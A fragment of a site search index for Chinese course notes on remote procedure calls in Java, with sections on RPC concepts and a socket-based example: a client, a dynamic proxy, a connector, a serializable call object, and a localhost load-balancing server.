RemoteCall() { } public RemoteCall(String className, String methodName, Class<?>[] paramTypes, Object[] params) { this.className = className; this.methodName = methodName; this.paramTypes = paramTypes; this.params = params; } public String getClassName() { return className; } public void setClassName(String className) { this.className = className; } public String getMethodName() { return methodName; } public void setMethodName(String methodName) { this.methodName = methodName; } public Class<?>[] getParamTypes() { return paramTypes; } public void setParamTypes(Class<?>[] paramTypes) { this.paramTypes = paramTypes; } public Object[] getParams() { return params; } public void setParams(Object[] params) { this.params = params; } public Object getResult() { return result; } public void setResult(Object result) { this.result = result; } public String toString() { return \"className=\" + className + \" methodName=\" + methodName; } } 5.3. \u670d\u52a1\u7aef # package rpc; import java.io.InputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.OutputStream; import java.lang.reflect.Method; import java.net.Proxy; import java.net.ServerSocket; import java.net.Socket; import java.util.HashMap; import java.util.Map; import service.loginServiceImp; import java.util.Random; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.Future; public class Server { private final static String CLASS_PATH = \"service.\"; // \u5b58\u653e\u8fdc\u7a0b\u5bf9\u8c61\u7684\u7f13\u5b58 private HashMap<String, Object> remoteObjects = new HashMap<>(); //\u6ce8\u518c\u670d\u52a1\uff1a\u628a\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u653e\u5230\u7f13\u5b58\u4e2d public void register(String className, Object remoteObject) { remoteObjects.put(className, remoteObject); } // 8000\u7aef\u53e3\u8d1f\u8f7d\u5747\u8861 public void transferService(ServerSocket serverSocket, int threadId) throws Exception { //\u968f\u673a\u6570\u751f\u6210\u5668 final Random random = new Random(); // \u5faa\u73af\u8fd0\u884c while (true) { System.out.println(String.format(\"Thread:%d \u8d1f\u8f7d\u5747\u8861\u542f\u52a8......\", threadId)); // \u521b\u5efahashMap HashMap<String, Object> map = new HashMap<>(); // \u7b49\u5f85\u670d\u52a1 Socket socket = serverSocket.accept(); // \u83b7\u53d6\u5ba2\u6237\u7aef\u8f93\u5165\u6d41 ObjectInputStream clientOis = new ObjectInputStream(socket.getInputStream()); // \u83b7\u53d6\u5ba2\u6237\u7aef\u8f93\u51fa\u6d41 ObjectOutputStream clientOos = new ObjectOutputStream(socket.getOutputStream()); // \u5c06\u5ba2\u6237\u7aef\u4f20\u8f93\u7684\u5bf9\u8c61\u5b58\u5165HashMap map.put(\"clientObject\", (RemoteCall) clientOis.readObject()); // \u968f\u673a\u83b7\u53d6\u4e00\u4e2a\u7aef\u53e3 int serverIndex = 8001 + random.nextInt(2); // \u6253\u5f00\u7aef\u53e3 Socket targetSocket = new Socket(\"localhost\", serverIndex); // \u8f93\u51fa System.out.println(String.format(\"Thread:%d \u8d1f\u8f7d\u5747\u8861\u4f20\u8f93\u4efb\u52a1\u5230\u7aef\u53e3 %d......\", threadId, serverIndex)); // \u83b7\u53d6\u8f93\u51fa\u5bf9\u8c61\u6d41 ObjectOutputStream oos = new ObjectOutputStream(targetSocket.getOutputStream()); // \u4f20\u8f93hashMap oos.writeObject(map); // \u83b7\u53d6\u8f93\u5165\u5bf9\u8c61\u6d41 ObjectInputStream serverOis = new ObjectInputStream(targetSocket.getInputStream()); // \u63a5\u6536\u670d\u52a1\u5668\u53d1\u9001\u7684Call \u5bf9\u8c61 RemoteCall remotecallobj = (RemoteCall) serverOis.readObject(); // \u5411\u5ba2\u6237\u7aef\u53d1\u9001\u5bf9\u8c61 clientOos.writeObject(remotecallobj); // \u5173\u95ed\u8d44\u6e90 oos.close(); socket.close(); clientOos.close(); } } // \u66b4\u9732\u670d\u52a1\uff0c\u521b\u5efa\u57fa\u4e8e\u6d41\u7684Socket,\u5e76\u57288001\u30018002 \u7aef\u53e3\u76d1\u542c public void exportService(ServerSocket serverSocket, int threadId) throws Exception { // \u5faa\u73af\u8fd0\u884c while (true) { System.out.println(String.format(\"Thread:%d \u670d\u52a1\u5668\u542f\u52a8......\", threadId)); Socket socket = serverSocket.accept(); // \u83b7\u53d6\u8d1f\u8f7d\u670d\u52a1\u5668\u8f93\u5165\u6d41 ObjectInputStream ois = new ObjectInputStream(socket.getInputStream()); // \u83b7\u53d6\u8d1f\u8f7d\u670d\u52a1\u5668\u8f93\u51fa\u6d41 ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream()); // \u83b7\u53d6\u8d1f\u8f7d\u670d\u52a1\u5668\u4f20\u5165\u7684hashMap HashMap<String, Object> map = (HashMap<String, Object>) ois.readObject(); // \u63a5\u6536\u5ba2\u6237\u53d1\u9001\u7684Call \u5bf9\u8c61 RemoteCall remotecallobj = (RemoteCall) map.get(\"clientObject\"); // \u8f93\u51fa System.out.println(remotecallobj); // \u8c03\u7528\u76f8\u5173\u5bf9\u8c61\u7684\u65b9\u6cd5 System.out.println(String.format(\"Thread:%d calling......\", threadId)); remotecallobj = invoke(remotecallobj); // \u5411\u5ba2\u6237\u53d1\u9001\u5305\u542b\u4e86\u6267\u884c\u7ed3\u679c\u7684remotecallobj \u5bf9\u8c61 oos.writeObject(remotecallobj); ois.close(); oos.close(); socket.close(); } } public RemoteCall invoke(RemoteCall call) { Object result = null; try { String className = call.getClassName(); String methodName = call.getMethodName(); Object[] params = call.getParams(); Class<?> classType = Class.forName(className); Class<?>[] paramTypes = call.getParamTypes(); Method method = classType.getMethod(methodName, paramTypes); // \u4ecehashmap\u7f13\u5b58\u4e2d\u53d6\u51fa\u76f8\u5173\u7684\u8fdc\u7a0b\u5bf9\u8c61Object Object remoteObject = remoteObjects.get(className); if (remoteObject == null) { throw new Exception(className + \" \u7684\u8fdc\u7a0b\u5bf9\u8c61\u4e0d\u5b58\u5728\"); } else { result = method.invoke(remoteObject, params); System.out.println(\"\u8fdc\u7a0b\u8c03\u7528\u7ed3\u675f:remotObject:\" + remoteObject.toString() + \",params:\" + params.toString()); } } catch (Exception e) { System.out.println(\"\u9519\u8bef\uff1a\" + e.getMessage()); } call.setResult(result); return call; } public static void main(String args[]) throws Exception { // \u7ebf\u7a0b\u6570\u91cf int threadNum = 6; // \u521d\u59cb\u5316 Server server = new Server(); // \u521b\u5efa\u591a\u7ebf\u7a0b ExecutorService executor = Executors.newFixedThreadPool(threadNum); //\u628a\u4e8b\u5148\u521b\u5efa\u7684RemoteServceImpl \u5bf9\u8c61\u52a0\u4eba\u5230\u670d\u52a1\u5668\u7684\u7f13\u5b58\u4e2d //\u5728\u670d\u52a1\u6ce8\u518c\u4e2d\u5fc3\u6ce8\u518c\u670d\u52a1 server.register(CLASS_PATH + \"loginService\", new loginServiceImp()); // \u591a\u7ebf\u7a0b\u8fd0\u884c Future[] future = new Future[threadNum]; // \u521b\u5efa\u7aef\u53e3\u6570\u7ec4 ServerSocket[] serverSocket = new ServerSocket[threadNum]; // \u521b\u5efa8000\u7aef\u53e3 ServerSocket port8000 = new ServerSocket(8000); // \u521b\u5efa8001\u7aef\u53e3 ServerSocket port8001 = new ServerSocket(8001); // \u521b\u5efa8002\u7aef\u53e3 ServerSocket port8002 = new ServerSocket(8002); for (int i = 0; i < threadNum; i++) { // \u7b2c\u4e00\u3001\u4e8c\u4e2a\u7ebf\u7a0b\u7aef\u53e3\u4e3a8000\uff0c\u8d1f\u8d23\u8c03\u5ea6\u8d44\u6e90\uff0c\u8d1f\u8f7d\u5747\u8861 if (i <= 1) { serverSocket[i] = port8000; } else if (i <= 3) { // \u7b2c\u4e09\u3001\u56db\u4e2a\u7ebf\u7a0b\u7aef\u53e3\u4e3a8001\uff0c\u6a21\u62df\u7b2c\u4e00\u53f0\u4e3b\u673a serverSocket[i] = port8001; } else { // \u7b2c\u4e94\u3001\u516d\u4e2a\u7ebf\u7a0b\u7aef\u53e3\u4e3a8002\uff0c\u6a21\u62df\u7b2c\u4e8c\u53f0\u4e3b\u673a serverSocket[i] = port8002; } } // \u5faa\u73af\u521b\u5efa\u7ebf\u7a0b for (int i = 0; i < threadNum; i++) { int finalI = i; future[i] = executor.submit(() -> { try { // 8000\u7aef\u53e3\u8d1f\u8f7d\u5747\u8861 if (finalI <= 1) { server.transferService(serverSocket[finalI], finalI + 1); } else { //\u6253\u5f00\u7f51\u7edc\u7aef\u53e3\uff0c\u63a5\u53d7\u5916\u90e8\u8bf7\u6c42\uff0c\u6267\u884c\u670d\u52a1\u529f\u80fd\uff0c\u8fd4\u56de\u7ed3\u679c server.exportService(serverSocket[finalI], finalI + 1); } } catch (Exception e) { e.printStackTrace(); } return 1; }); } // \u5faa\u73af\u83b7\u53d6\u7ebf\u7a0b\u7ed3\u679c\uff0c\u963b\u585e\u540c\u6b65 for (int i = 0; i < threadNum; i++) { future[i].get(); } // \u5173\u95ed\u7aef\u53e3 for (int i = 0; i < threadNum; i++) { serverSocket[i].close(); } } } 6. \u53c2\u8003\u6587\u732e # [1] https://www.tutorialspoint.com/remote-procedure-call-rpc \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"8.Java\u4e2d\u7684\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528(RPC)"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#javarpc","text":"","title":"Java\u4e2d\u7684\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528(RPC)"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#_1","text":"Java\u4e2d\u7684\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528(RPC) \u76ee\u5f55 1. \u80cc\u666f 2. \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u5b9a\u4e49 3. \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u4f18\u70b9 4. \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u7f3a\u70b9 5. \u5b9e\u4f8b 5.1. \u5ba2\u6237\u7aef 5.1.1. \u5ba2\u6237\u7aef\u5b9e\u73b0 5.1.2. \u52a8\u6001\u4ee3\u7406\u7c7b 5.1.3. \u8fde\u63a5\u5668 5.2. \u8fdc\u7a0b\u5bf9\u8c61 5.3. \u670d\u52a1\u7aef 6. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#1","text":"\u8fd9\u5b66\u671f\u4e0a\u4e86\u300a\u5206\u5e03\u5f0f\u7cfb\u7edf\u300b\u8bfe\u7a0b\uff0c\u5185\u5bb9\u4e3b\u8981\u662f\u57fa\u4e8eJava\u5b9e\u73b0\u5206\u5e03\u5f0f\u8ba1\u7b97\uff0c\u6240\u4ee5\u8001\u5e08\u524d\u51e0\u8282\u8bfe\u4e3b\u8981\u5728\u7ed9\u6211\u4eec\u8bb2\u7528Java\u505a\u5206\u5e03\u5f0f\u53ef\u80fd\u4f1a\u7528\u5230\u7684\u4e00\u4e9b\u6280\u672f\u3002\u4e3a\u4e86\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\uff0c\u6211\u5c06\u8001\u5e08\u8bb2\u7684\u5185\u5bb9\u7ed3\u5408\u4e66\u7c4d\u548c\u8d44\u6599\u505a\u4e86\u4e00\u4e9b\u6574\u7406\uff0c\u8fd9\u4e00\u7bc7\u4e3b\u8981\u8ba8\u8bba\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#2","text":"\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u662f\u4e00\u79cd\u8fdb\u7a0b\u95f4\u901a\u4fe1\u6280\u672f\uff0c\u7528\u4e8e\u57fa\u4e8e\u5ba2\u6237\u7aef-\u670d\u52a1\u5668\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u4e5f\u88ab\u79f0\u4e3a\u5b50\u4f8b\u7a0b\u8c03\u7528\u6216\u51fd\u6570\u8c03\u7528\u3002 \u5ba2\u6237\u7aef\u6709\u4e00\u4e2a\u8bf7\u6c42\u6d88\u606f\uff0cRPC\u5c06\u5176\u8f6c\u6362\u5e76\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u3002\u6b64\u8bf7\u6c42\u53ef\u4ee5\u662f\u5bf9\u8fdc\u7a0b\u670d\u52a1\u5668\u7684\u8fc7\u7a0b\u6216\u51fd\u6570\u8c03\u7528\u3002\u5f53\u670d\u52a1\u5668\u63a5\u6536\u5230\u8bf7\u6c42\u65f6\uff0c\u5b83\u5c06\u6240\u9700\u7684\u54cd\u5e94\u53d1\u9001\u56de\u5ba2\u6237\u673a\u3002\u5ba2\u6237\u7aef\u5728\u670d\u52a1\u5668\u5904\u7406\u8c03\u7528\u65f6\u88ab\u963b\u585e\uff0c\u53ea\u6709\u5728\u670d\u52a1\u5668\u5b8c\u6210\u540e\u624d\u6062\u590d\u6267\u884c\u3002 1 \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u987a\u5e8f\u5982\u4e0b: \u5ba2\u6237\u7aef\u5b58\u6839\u7531\u5ba2\u6237\u7aef\u8c03\u7528\u3002 \u5ba2\u6237\u7aef\u5b58\u6839\u53d1\u51fa\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5c06\u6d88\u606f\u53d1\u9001\u5230\u670d\u52a1\u5668\uff0c\u5e76\u5c06\u53c2\u6570\u653e\u5165\u6d88\u606f\u4e2d\u3002 \u5ba2\u6237\u7aef\u64cd\u4f5c\u7cfb\u7edf\u5c06\u6d88\u606f\u4ece\u5ba2\u6237\u7aef\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002 \u6d88\u606f\u7531\u670d\u52a1\u5668\u64cd\u4f5c\u7cfb\u7edf\u4f20\u9012\u5230\u670d\u52a1\u5668\u5b58\u6839\u3002 \u670d\u52a1\u5668\u5b58\u6839\u4ece\u6d88\u606f\u4e2d\u5220\u9664\u53c2\u6570\u3002 \u7136\u540e\uff0c\u670d\u52a1\u5668\u5b58\u6839\u8c03\u7528\u670d\u52a1\u5668\u6267\u884c\u64cd\u4f5c\u3002 \u6267\u884c\u5b8c\u6210\u540e\uff0c\u7ed3\u679c\u539f\u8def\u8fd4\u56de\u5230\u5ba2\u6237\u7aef\u3002 \u8fc7\u7a0b\u5982\u4e0b\u56fe\u6240\u793a","title":"2. \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u5b9a\u4e49"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#3","text":"RPC\u7684\u4e00\u4e9b\u4f18\u70b9\u5982\u4e0b: \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u652f\u6301\u9762\u5411\u8fc7\u7a0b\u548c\u9762\u5411\u7ebf\u7a0b\u7684\u6a21\u578b\u3002 RPC\u7684\u5185\u90e8\u6d88\u606f\u4f20\u9012\u673a\u5236\u5bf9\u7528\u6237\u9690\u85cf\u3002\u91cd\u5199\u548c\u91cd\u65b0\u5f00\u53d1\u4ee3\u7801\u7684\u5de5\u4f5c\u91cf\u5728\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u4e2d\u662f\u6700\u5c0f\u7684\u3002 \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u53ef\u4ee5\u5728\u5206\u5e03\u5f0f\u73af\u5883\u4e2d\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728\u672c\u5730\u73af\u5883\u4e2d\u4f7f\u7528\u3002 \u4e3a\u4e86\u63d0\u9ad8\u6027\u80fd\uff0cRPC\u7701\u7565\u4e86\u8bb8\u591a\u534f\u8bae\u5c42\u3002","title":"3. \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u4f18\u70b9"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#4","text":"RPC\u7684\u4e00\u4e9b\u7f3a\u70b9\u5982\u4e0b: \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u662f\u4e00\u4e2a\u53ef\u4ee5\u7528\u4e0d\u540c\u65b9\u5f0f\u5b9e\u73b0\u7684\u6982\u5ff5\u3002\u5b83\u4e0d\u662f\u4e00\u4e2a\u6807\u51c6\u3002 RPC\u5bf9\u4e8e\u786c\u4ef6\u67b6\u6784\u6ca1\u6709\u7075\u6d3b\u6027\u3002\u5b83\u53ea\u57fa\u4e8e\u4ea4\u4e92\u3002 \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u800c\u589e\u52a0\u4e86\u6210\u672c\u3002","title":"4. \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u7f3a\u70b9"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#5","text":"Java \u4e2d\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u53cd\u5c04\u673a\u5236\u548c\u52a8\u6001\u4ee3\u7406\u6765\u5b9e\u73b0\u4e00\u4e2aRPC\u6846\u67b6\u3002","title":"5. \u5b9e\u4f8b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#51","text":"","title":"5.1. \u5ba2\u6237\u7aef"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#511","text":"package service; import rpc.DynamicProxyFactory; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; public class clienTest { static void test(int threadId) { // \u8fd9\u91cc\u5b9e\u73b0\u4e86\u4e00\u4e2a\u767b\u9646\u7684\u64cd\u4f5c // \u5b9e\u73b0\u7ec6\u8282\u5e76\u4e0d\u91cd\u8981\uff0c\u6240\u4ee5\u6ca1\u6709\u7ed9\u51fa loginService \u7684\u4ee3\u7801 // \u901a\u8fc7\u52a8\u6001\u4ee3\u7406\u4e0e\u670d\u52a1\u5668\u5efa\u7acb\u8fde\u63a5 loginService loginservice = DynamicProxyFactory.getProxy(loginService.class, \"localhost\", 8000); // \u6267\u884c\u8fdc\u7a0b\u64cd\u4f5c String Result = loginservice.login(\"123\", \"123\"); // \u8f93\u51fa\u7ed3\u679c System.out.println(String.format(\"Client Thread %d result= %s\",threadId, Result)); } public static void main(String[] args) throws Exception { int threadNum = 4; // \u521b\u5efa\u591a\u7ebf\u7a0b ExecutorService executor = Executors.newFixedThreadPool(4); // \u591a\u7ebf\u7a0b\u8c03\u7528 for (int i = 0; i < 4; i++) { int finalI = i; executor.submit(() -> { test(finalI + 1); }); } } }","title":"5.1.1. \u5ba2\u6237\u7aef\u5b9e\u73b0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#512","text":"package rpc; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; // \u52a8\u6001\u4ee3\u7406\u7c7b public class DynamicProxyFactory { @SuppressWarnings(\"unchecked\") public static <T> T getProxy(final Class<T> classType, final String host, final int port) {//\u6cdb\u578b\u65b9\u6cd5\uff0c\u4f20\u5165\u4ec0\u4e48\u7c7b\u578b\u8fd4\u56de\u4ec0\u4e48\u7c7b\u578b InvocationHandler handler = (proxy, method, args) -> { Connector connector = null; try { connector = new Connector(host, port); RemoteCall call = new RemoteCall(classType.getName(), method.getName(), method.getParameterTypes(), args); connector.send(call); call = (RemoteCall) connector.receive(); return call.getResult(); } finally { if (connector != null) connector.close(); } }; System.out.println(\"\u4ee3\u7406\u5f00\u59cb\u6267\u884c\"); return (T) Proxy.newProxyInstance(classType.getClassLoader(),new Class<?>[]{classType}, handler); } }","title":"5.1.2. \u52a8\u6001\u4ee3\u7406\u7c7b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#513","text":"package rpc; import java.io.InputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.OutputStream; import java.net.Socket; public class Connector { private String host; private int port; private Socket skt; private InputStream is; private ObjectInputStream ois; private OutputStream os; private ObjectOutputStream oos; public Connector(String host, int port) throws Exception { this.host = host; this.port = port; connect(host, port); } // \u53d1\u9001\u5bf9\u8c61\u65b9\u6cd5 public void send(Object obj) throws Exception { oos.writeObject(obj); } // \u63a5\u6536\u5bf9\u8c61\u65b9\u6cd5 public Object receive() throws Exception { return ois.readObject(); } // \u5efa\u7acb\u4e0e\u8fdc\u7a0b\u670d\u52a1\u5668\u7684\u8fde\u63a5 public void connect() throws Exception { connect(host, port); } // \u5efa\u7acb\u4e0e\u8fdc\u7a0b\u670d\u52a1\u5668\u7684\u8fde\u63a5 public void connect(String host, int port) throws Exception { skt = new Socket(host, port); os = skt.getOutputStream(); oos = new ObjectOutputStream(os); is = skt.getInputStream(); ois = new ObjectInputStream(is); } // \u5173\u95ed\u8fde\u63a5 public void close() { try { ois.close(); oos.close(); skt.close(); } catch (Exception e) { System.out.println(\" Conector.close :\" + e); } } }","title":"5.1.3. \u8fde\u63a5\u5668"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#52","text":"package rpc; import java.io.Serializable; //\u76f8\u5f53\u4e8e\u4e00\u4e2ajavaBean public class RemoteCall implements Serializable { private static final long serialVersionUID = 1L; private String className;// \u8868\u793a\u670d\u52a1\u7c7b\u540d\u6216\u63a5\u53e3\u540d private String methodName; // \u8868\u793a\u529f\u80fd\u65b9\u6cd5\u540d private Class<?>[] paramTypes;//\u8868\u793a\u65b9\u6cd5\u53c2\u6570\u7c7b\u578b private Object[] params;//\u8868\u793a\u65b9\u6cd5\u53c2\u6570\u503c/\u5982\u679c\u65b9\u6cd5\u6b63\u5e38\u6267\u884c\uff0c\u5219resul \u4e3a\u65b9\u6cd5\u8fd4\u56de\u503c\uff0c\u5982\u679c\u65b9\u6cd5\u629b\u51fa\u5f02\u5e38\uff0c\u5219resul \u4e3a\u8be5\u5f02\u5e38 private Object result; public RemoteCall() { } public RemoteCall(String className, String methodName, Class<?>[] paramTypes, Object[] params) { this.className = className; this.methodName = methodName; this.paramTypes = paramTypes; this.params = params; } public String getClassName() { return className; } public void setClassName(String className) { this.className = className; } public String getMethodName() { return methodName; } public void setMethodName(String methodName) { this.methodName = methodName; } public Class<?>[] getParamTypes() { return paramTypes; } public void setParamTypes(Class<?>[] paramTypes) { this.paramTypes = paramTypes; } public Object[] getParams() { return params; } public void setParams(Object[] params) { this.params = params; } public Object getResult() { return result; } public void setResult(Object result) { this.result = result; } public String toString() { return \"className=\" + className + \" methodName=\" + methodName; } }","title":"5.2. \u8fdc\u7a0b\u5bf9\u8c61"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/#53","text":"package rpc; import java.io.InputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.OutputStream; import java.lang.reflect.Method; import java.net.Proxy; import java.net.ServerSocket; import java.net.Socket; import java.util.HashMap; import java.util.Map; import service.loginServiceImp; import java.util.Random; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; import java.util.concurrent.Future; public class Server { private final static String CLASS_PATH = \"service.\"; // \u5b58\u653e\u8fdc\u7a0b\u5bf9\u8c61\u7684\u7f13\u5b58 private HashMap<String, Object> remoteObjects = new HashMap<>(); //\u6ce8\u518c\u670d\u52a1\uff1a\u628a\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u653e\u5230\u7f13\u5b58\u4e2d public void register(String className, Object remoteObject) { remoteObjects.put(className, remoteObject); } // 8000\u7aef\u53e3\u8d1f\u8f7d\u5747\u8861 public void transferService(ServerSocket serverSocket, int threadId) throws Exception { //\u968f\u673a\u6570\u751f\u6210\u5668 final Random random = new Random(); // \u5faa\u73af\u8fd0\u884c while (true) { System.out.println(String.format(\"Thread:%d \u8d1f\u8f7d\u5747\u8861\u542f\u52a8......\", threadId)); // \u521b\u5efahashMap HashMap<String, Object> map = new HashMap<>(); // \u7b49\u5f85\u670d\u52a1 Socket socket = serverSocket.accept(); // \u83b7\u53d6\u5ba2\u6237\u7aef\u8f93\u5165\u6d41 ObjectInputStream clientOis = new ObjectInputStream(socket.getInputStream()); // \u83b7\u53d6\u5ba2\u6237\u7aef\u8f93\u51fa\u6d41 ObjectOutputStream clientOos = new ObjectOutputStream(socket.getOutputStream()); // \u5c06\u5ba2\u6237\u7aef\u4f20\u8f93\u7684\u5bf9\u8c61\u5b58\u5165HashMap map.put(\"clientObject\", (RemoteCall) clientOis.readObject()); // \u968f\u673a\u83b7\u53d6\u4e00\u4e2a\u7aef\u53e3 int serverIndex = 8001 + random.nextInt(2); // \u6253\u5f00\u7aef\u53e3 Socket targetSocket = new Socket(\"localhost\", serverIndex); // \u8f93\u51fa System.out.println(String.format(\"Thread:%d \u8d1f\u8f7d\u5747\u8861\u4f20\u8f93\u4efb\u52a1\u5230\u7aef\u53e3 %d......\", threadId, serverIndex)); // \u83b7\u53d6\u8f93\u51fa\u5bf9\u8c61\u6d41 ObjectOutputStream oos = new ObjectOutputStream(targetSocket.getOutputStream()); // \u4f20\u8f93hashMap oos.writeObject(map); // \u83b7\u53d6\u8f93\u5165\u5bf9\u8c61\u6d41 ObjectInputStream serverOis = new ObjectInputStream(targetSocket.getInputStream()); // \u63a5\u6536\u670d\u52a1\u5668\u53d1\u9001\u7684Call \u5bf9\u8c61 RemoteCall remotecallobj = (RemoteCall) serverOis.readObject(); // \u5411\u5ba2\u6237\u7aef\u53d1\u9001\u5bf9\u8c61 clientOos.writeObject(remotecallobj); // \u5173\u95ed\u8d44\u6e90 oos.close(); socket.close(); clientOos.close(); } } // \u66b4\u9732\u670d\u52a1\uff0c\u521b\u5efa\u57fa\u4e8e\u6d41\u7684Socket,\u5e76\u57288001\u30018002 \u7aef\u53e3\u76d1\u542c public void exportService(ServerSocket serverSocket, int threadId) throws Exception { // \u5faa\u73af\u8fd0\u884c while (true) { System.out.println(String.format(\"Thread:%d \u670d\u52a1\u5668\u542f\u52a8......\", threadId)); Socket socket = serverSocket.accept(); // \u83b7\u53d6\u8d1f\u8f7d\u670d\u52a1\u5668\u8f93\u5165\u6d41 ObjectInputStream ois = new ObjectInputStream(socket.getInputStream()); // \u83b7\u53d6\u8d1f\u8f7d\u670d\u52a1\u5668\u8f93\u51fa\u6d41 ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream()); // \u83b7\u53d6\u8d1f\u8f7d\u670d\u52a1\u5668\u4f20\u5165\u7684hashMap 